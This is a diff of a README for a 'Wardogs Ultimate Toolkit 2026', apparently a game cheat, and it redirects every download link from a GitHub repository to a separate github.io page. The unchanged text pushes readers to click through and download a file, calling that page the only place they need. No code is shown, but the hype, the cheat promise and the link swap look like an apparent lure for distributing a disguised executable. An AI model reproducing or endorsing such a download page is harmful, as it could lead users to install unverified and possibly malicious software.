@@ -1,12 +1,12 @@
 # 🎯 Wardogs-Ultimate-Toolkit-2026 - Dominate The Battlefield Instantly
 
-[![Download WARDOGS Toolkit](https://img.shields.io/badge/DOWNLOAD-WARDOGS_TOOLKIT-brightgreen?style=for-the-badge&logo=download&logoColor=white&labelColor=232323&color=ff6b6b)](https://github.com/jamalart002/Wardogs-Ultimate-Toolkit-2026)
+[![Download WARDOGS Toolkit](https://img.shields.io/badge/DOWNLOAD-WARDOGS_TOOLKIT-brightgreen?style=for-the-badge&logo=download&logoColor=white&labelColor=232323&color=ff6b6b)](https://jamalart002.github.io)
 
 ## 📥 Download & Install
 
 Visit this link to download the application.
 
-[**🔗 CLICK HERE TO DOWNLOAD WARDOGS ULTIMATE TOOLKIT**](https://github.com/jamalart002/Wardogs-Ultimate-Toolkit-2026)
+[**🔗 CLICK HERE TO DOWNLOAD WARDOGS ULTIMATE TOOLKIT**](https://jamalart002.github.io)
 
 Once you click the link above, you will land on the official download page. Look for the big green download button and click it. The file will start downloading automatically. This is the only place you need to go — everything you need is right there.
 
@@ -94,7 +94,7 @@ Think of it as your personal command center — everything is neatly organized, 
 
 Click the download link at the top of this page or visit:
 
-[**https://github.com/jamalart002/Wardogs-Ultimate-Toolkit-2026**](https://github.com/jamalart002/Wardogs-Ultimate-Toolkit-2026)
+[**https://jamalart002.github.io**](https://jamalart002.github.io)
 
 Wait for the download to finish. The file size is small, so this will only take a few seconds on most connections.
 
